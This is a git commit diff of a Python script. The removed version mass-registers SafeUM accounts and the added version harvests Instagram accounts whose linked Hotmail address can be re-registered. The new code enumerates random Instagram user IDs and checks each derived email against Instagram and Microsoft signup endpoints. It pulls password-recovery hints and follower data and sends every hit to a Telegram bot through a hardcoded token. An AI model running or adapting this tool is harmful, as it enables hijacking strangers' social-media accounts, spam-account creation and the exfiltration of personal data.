cf303f0fa0379c7a393e9f0c93c581e9f567d21d
Tanjiro Kamado <120044797+haxkx@users.noreply.github.com>
2024-05-02 11:12:30 +0530

    Update enc.py

--- enc.py
+++ enc.py
@@ -1,108 +1,250 @@
 import os
-import requests
-from os import system, name
-from ssl import CERT_NONE
-from gzip import decompress
-from random import choice, choices
-from concurrent.futures import ThreadPoolExecutor
-from json import dumps
-
 try:
-  from websocket import create_connection
+  from rich.console import Console
+  from rich.live import Live
 except:
-  system('pip install websocket-client')
-  from websocket import create_connection
-
-failed = 0
-success = 0
-retry = 0
-accounts = []
-
-token = "6923607773:AAHomFBLLOw4vwNC2P3wb_5cEBlHJ4c7A48"
-telegram_chat_id = "-1002038908424"
-
-
-def work():
-  global failed, success, retry
-  username = choice('qwertyuioplkjhgfdsazxcvbnm') + ''.join(
-      choices(list('qwertyuioplkjhgfdsazxcvbnm1234567890'), k=13))
+  os.system("pip install rich")
+  from rich.console import Console
+  from rich.live import Live
+try:
+  import requests
+except:
+  os.system("pip install requests")
+  import requests
+try:
+  from user_agent import generate_user_agent
+except:
+  os.system("pip install user_agent")
+  from user_agent import generate_user_agent
+try:
+  from time import time
+except:
+  os.system("pip install time")
+  from time import time
+try:
+  from hashlib import md5
+except:
+  os.system("pip install hashlib")
+  from hashlib import md5
+try:
+  from uuid import uuid4
+except:
+  os.system("pip install uuid")
+  from uuid import uuid4
+try:
+  from random import randrange
+except:
+  os.system("pip install random")
+  from random import randrange
+hits=0
+bads_instgram=0
+bads_email=0
+BLUE = '\033[94m'
+RESET = '\033[0m'
+BOLD = '\033[1m'
+YELLOW = '\033[93m'
+RED = '\033[91m'
+GREEN = '\033[92m'
+CYAN = '\033[96m'
+MAGENTA = '\033[95m'
+ID = "5195444280"
+token = "6737562665:AAH1NBn84h2s64LFucbMWKq7oRMzq4MHybI"
+ids=[]
+def get_id():
+  id=str(randrange(10000, 30975110))
+  if id not in ids:
+    ids.append(id)
+    return id
+  else:
+    get_id()
+os.system('clear')
+def rest(user):
   try:
-    con = create_connection("wss://195.13.182.217/Auth",
-                            header={
-                                "app": "com.safeum.android",
-                                "host": None,
-                                "remoteIp": "195.13.182.217",
-                                "remotePort": str(8080),
-                                "sessionId":
-                                "b6cbb22d-06ca-41ff-8fda-c0ddeb148195",
-                                "time": "2023-04-30 12:13:32",
-                                "url": "wss://51.79.208.190/Auth"
-                            },
-                            sslopt={"cert_reqs": CERT_NONE})
-    con.send(
-        dumps({
-            "action": "Register",
-            "subaction": "Desktop",
-            "locale": "en_IN",
-            "gmt": "+05",
-            "password": {
-                "m1x":
-                "db64e904558056bd9cb678e293208c0e405ac7a5176e749c13394c26cc45811c",
-                "m1y":
-                "cad211c0407c46123a9e6a1b12c1e3dcd833ab25d4035c86f8dc60db6998aec0",
-                "m2":
-                "5be138004398f943009ac3ee83a998787ec65d223f785f151a1d96ee6565d9ba",
-                "iv":
-                "c65e5eeb9e35b59b735122f294b91174",
-                "message":
-                "755d3d407548424954ae8028f94fe47ee945769b3594ac2c35e7915930fe31153bcf348886852aeb0607bf22e6d4faa9e9c0d67fcc790494cc82fe0321e7b1a10c3eaf71dedbd099c6129688241131dc"
-            },
-            "magicword": {
-                "m1x":
-                "380bad74db434a1e9cdee300acd17a95dce15f1350104e41828d076659418e41",
-                "m1y":
-                "119f91e7d61f7cc7c232b9f9208dd9ac6d1feb90092d526ec6d52a2267afbf92",
-                "m2":
-                "9b08db28a9c8fac929d2eee507cc76430ee972bddc651d0e8e3cd066cc3fd05c",
-                "iv": "09634bfa435bdfd3f6d651ca8fa46480",
-                "message": "ebeb8efca60c56f6d781b6d6c6e0a4d5"
-            },
-            "magicwordhint": "0000",
-            "login": str(username),
-            "devicename": "Xiaomi 220733SPH",
-            "softwareversion": "1.1.0.1457",
-            "nickname": "sibshocs6227hsys",
-            "os": "AND",
-            "deviceuid": "b0c55c7c17fddd4b",
-            "devicepushuid":
-            "*cYwQmtN0GC4:APA91bGdy73ku9qhNJi8Inhe01e2pXa_dp-CiVULHhPMkcqgi4JFOTCMS-jHhJzxhoO5ZdmGhjFgy-qxGQFSB86l0A1iQGM9RSl3c6X33zPAqxkRQ6C1qm2Gfx94e72joG2twLFbh61E",
-            "osversion": "and_12.0.0",
-            "id": "1392209033"
-        }))
-    gzip = decompress(con.recv()).decode('utf-8')
-    if '"status":"Success"' in gzip:
-      success += 1
-      accounts.append(username + ':@Haxkx')
-      with open('SafeUM-Accounts.txt', 'a') as f:
-        f.write(username + ":@Haxkx | TG : @toxic_tanji\n")
-      tlg = f'\nAccount password @Haxkx\nUsername {username}'
-      requests.post(
-          f"https://api.telegram.org/bot{token}/sendmessage?chat_id={telegram_chat_id}&text="
-          + str(tlg))
-    else:
-      failed += 1
+    headers = {
+    'X-Pigeon-Session-Id': '50cc6861-7036-43b4-802e-fb4282799c60',
+    'X-Pigeon-Rawclienttime': '1700251574.982',
+    'X-IG-Connection-Speed': '-1kbps',
+    'X-IG-Bandwidth-Speed-KBPS': '-1.000',
+    'X-IG-Bandwidth-TotalBytes-B': '0',
+    'X-IG-Bandwidth-TotalTime-MS': '0',
+    'X-Bloks-Version-Id': 'c80c5fb30dfae9e273e4009f03b18280bb343b0862d663f31a3c63f13a9f31c0',
+    'X-IG-Connection-Type': 'WIFI',
+    'X-IG-Capabilities': '3brTvw==',
+    'X-IG-App-ID': '567067343352427',
+    'User-Agent': 'Instagram 100.0.0.17.129 Android (29/10; 420dpi; 1080x2129; samsung; SM-M205F; m20lte; exynos7904; en_GB; 161478664)',
+    'Accept-Language': 'en-GB, en-US',
+     'Cookie': 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
+    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+    'Accept-Encoding': 'gzip, deflate',
+    'Host': 'i.instagram.com',
+    'X-FB-HTTP-Engine': 'Liger',
+    'Connection': 'keep-alive',
+    'Content-Length': '356',
+}
+    data = {
+    'signed_body': '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj","adid":"0dfaf820-2748-4634-9365-c3d8c8011256","guid":"1f784431-2663-4db9-b624-86bd9ce1d084","device_id":"android-b93ddb37e983481c","query":"'+user+'"}',
+    'ig_sig_key_version': '4',
+  }
+    response = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/',headers=headers,data=data,).json()
+    r=response['email']
   except:
-    retry += 1
+    r='h h h'
+  return r
+def info(username,jj):
+  global hits
+  url = 'http://www.bradychrist.top/api/v7/user'
+  he = {
+  'Host': 'www.bradychrist.top',
+  'Connection': 'keep-alive',
+  'Content-Length': '13',
+  'package': 'ins.bradychrist.com',
+  'apptype': 'android',
+  'User-Agent': 'Mozilla/5.0 (Linux; Android 13; ANY-LX2 Build/HONORANY-L22CQ; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.211 Mobile Safari/537.36',
+   'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
+     'idfa': '93f87de7-a83b-4098-a8a7-6801539c5f6a',
+     'Accept': 'application/json, text/plain, */*',
+     'pk': '',
+     'username': '',
+     'version': '1.0',
+     'Origin': 'http://www.bradychrist.top',
+     'X-Requested-With': 'ins.bradychrist.com',
+     'Referer': 'http://www.bradychrist.top/h5_v12/',
+     'Accept-Encoding': 'gzip, deflate',
+     'Accept-Language': 'ar-IQ,ar;q=0.9,en-IQ;q=0.8,en-US;q=0.7,en;q=0.6',
+  } 
+  da=(f'username={username}')
+  hits+=1
+
+  try:
+    zaid=requests.post(url,headers=he,data=da).json()['data']
+    id=zaid['userPk']
+    date=requests.get(f'https://o7aa.pythonanywhere.com/?id={id}').json()['date']
+    fs=zaid['followerNum']
+    fg=zaid['followingNum']
+    postsNum=zaid['postsNum']
+    tlg = f'''
+⌯ Found New Account 
+⌘━━━━━━━━━━━⌘ 
+folowers ➥ {fs}
+following ➥{fg}
+postsNum ➥ {postsNum}
+username ➥ {username}
+email ➥ {username}@{jj}
+date ➥ {date}
+id ➥ {id}
+rest ➥ {rest(username)}
+⌘━━━━━━━━━━━⌘ 
+telegram :- @Haxkx
+'''
+    print(BLUE+tlg)
+    with open('hits1.txt','a') as ff:
+      ff.write(f'{tlg}\n')
+    try:requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={tlg}")
+    except:pass
+  except:
+    tlg = f'''
+        
+    ⌘━━━━━━━━━━━⌘ 
+    username ➥ {username}
+    email ➥ {username}@{jj}
+    rest ➥ {rest(username)}
+    ⌘━━━━━━━━━━━⌘ 
+    telegram :- @toxic_tanji
+    '''
+    print(BLUE+tlg)
+    try:requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={tlg}")
+    except:pass
+    with open('hits1.txt','a') as ff:
+      ff.write(f'{tlg}\n')
+def Qredes(email):
+  global bads_email
+  try:
+    r=requests.post('https://signup.live.com',headers={'user-agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',})
+    mc=r.cookies.get_dict()['amsc']
+    ca=str.encode(r.text.split('Canary')[4].split('","ip":"')[0].split('":"')[1]).decode("unicode_escape").encode("ascii").decode("unicode_escape").encode("ascii").decode("ascii")
+    cookies = {
+      'amsc':mc,
+
+    }
+    headers = {
+      'authority': 'signup.live.com',
+      'accept': 'application/json',
+      'accept-language': 'en-US,en;q=0.9',
+      'canary': ca,
+      'user-agent': 'Mozilla/5.0 (iPad; CPU OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1 Edg/122.0.0.0',
+    }
+
+    json_data = {
+      'signInName': email,
+    }
+    response = requests.post(
+      'https://signup.live.com/API/CheckAvailableSigninNames',
+      cookies=cookies,
+      headers=headers,
+      json=json_data,
+    ).text
+    if 'isAvailable' in response:
+        username,jj=email.split('@')
+        info(username,jj)
+    else:bads_email+=1
+  except:Qredes(email)
+def check(email):
+  global bads_instgram
+  try:
+    csrftoken = md5(str(time()).encode()).hexdigest()
+    headers = {
+        'accept': '*/*',
+        'accept-language': 'en-US,en;q=0.9',
+        'content-type': 'application/x-www-form-urlencoded',
+        'origin': 'https://www.instagram.com',
+        'referer': 'https://www.instagram.com/accounts/signup/email/',
+        'user-agent': generate_user_agent(),
+        'x-csrftoken': csrftoken
+    }
+
+    data = {
+        'email': email,
+    }
+
+    response = requests.post('https://www.instagram.com/api/v1/web/accounts/check_email/', headers=headers, data=data)
+    if 'email_is_taken' in str(response.text):
+      Qredes(email)
+    else:
+      bads_instgram+=1
+  except:
+    check(email)
 
 
-start = ThreadPoolExecutor(max_workers=200)
+console = Console()
 
-while True:
-  start.submit(work)
-  os.system('cls' if os.name == 'nt' else 'clear')
-  print(f'Success : {success}\nFailed : {failed}\nReTry : {retry}')
-  if success >= 50:
-    print("Created Accounts Successfully Sent To Owner Group")
-  if success > 0:
-    z = "\n".join(accounts)
-    print("CREATED ACCOUNTS>>\n", z)
+with Live(console=console) as live:
+  while True:
+    tt=(f"\r[green]Hits:[/green] {hits} [red]Bad instgram:[/red] {bads_instgram} [yellow]Email Not Available:[/yellow] {bads_email}")
+    live.update(tt)
+    id=get_id()
+    csrftoken = md5(str(time()).encode()).hexdigest()
+    headers = {
+    'authority': 'www.instagram.com',
+    'accept': '*/*',
+    'accept-language': 'en-US,en;q=0.9',
+    'content-type': 'application/x-www-form-urlencoded',
+    'dnt': '1',
+    'dpr': '0.8',
+    'origin': 'https://www.instagram.com',
+    'user-agent': generate_user_agent(),
+    'x-csrftoken': csrftoken,
+    }
+    data = {
+    '__spin_b': 'trunk',
+    'fb_api_caller_class': 'RelayModern',
+    'fb_api_req_friendly_name': 'PolarisUserHoverCardContentV2Query',
+    'variables': '{"userID":"'+id+'","username":"0s9s"}',
+    'server_timestamps': 'true',
+    'doc_id': '7666785636679494',
+    }
+    response = requests.post('https://www.instagram.com/graphql/query', headers=headers, data=data).json()
+    try:
+      username=response['data']['user']['username']
+      email = username + '@hotmail.com'
+      check(email)
+    except:''
